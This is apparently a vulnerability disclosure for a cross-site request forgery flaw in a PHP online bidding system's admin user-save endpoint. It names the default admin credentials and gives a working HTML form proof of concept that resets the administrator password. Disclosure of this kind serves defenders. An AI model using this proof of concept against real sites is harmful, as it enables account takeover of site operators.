CSRF exists in the Sourcecoster simple online bidding system

official website:https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

version:v1.0

route：/simple-online-bidding-system/admin/ajax.php?action=save_user

related code file：ajax.php

related_function：save_user()


#### 1.Vulnerability verification and exploit

We need log in to the system backend as admin/admin123.The exploit proof-of-concept (PoC) for this vulnerability is as follows. When using it, you need to modify the relevant address information in the PoC according to the target environment, such as the host and refer fields.

CSRF POC
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/simple-online-bidding-system/admin/ajax.php?action=save_user" method="POST">
      <input type="hidden" name="id" value="1" />
      <input type="hidden" name="name" value="Administrator" />
      <input type="hidden" name="username" value="admin" />
      <input type="hidden" name="password" value="admin" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

The victim can click on the created page to modify the current victim's password without knowing it.

<img width="767" alt="image" src="https://github.com/Xu-Mingming/cve/assets/172484755/6ca03cf1-b2f3-4025-97c9-e630199c96e4">
<img width="1453" alt="image" src="https://github.com/Xu-Mingming/cve/assets/172484755/de88edfa-dbf5-42ac-b7df-80c312d8dab0">


